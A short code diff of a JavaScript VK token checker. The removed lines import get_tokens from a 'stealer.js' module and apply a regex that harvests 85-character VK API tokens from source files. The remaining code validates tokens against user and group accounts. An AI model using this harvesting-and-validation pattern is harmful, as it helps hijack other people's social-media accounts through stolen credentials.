@@ -1,5 +1,5 @@
 const { VK } = require("vk-io");
-const { get_tokens } = require("./stealer.js");
+
 const vk = new VK({});
 
 async function vk_checker_user(vktoken) {
@@ -23,8 +23,7 @@ async function vk_checker_group(vktoken) {
     return info;
 };
 
-async function vk_checker() {
-    let tokens = await get_tokens('import vk_api token', /token ?= ?['"]([a-zA-Z0-9]{85})['"]/);
+async function vk_checker(tokens) {
     let promises = tokens.map(async function (token) {
         try {
             let account = await vk_checker_user(token);
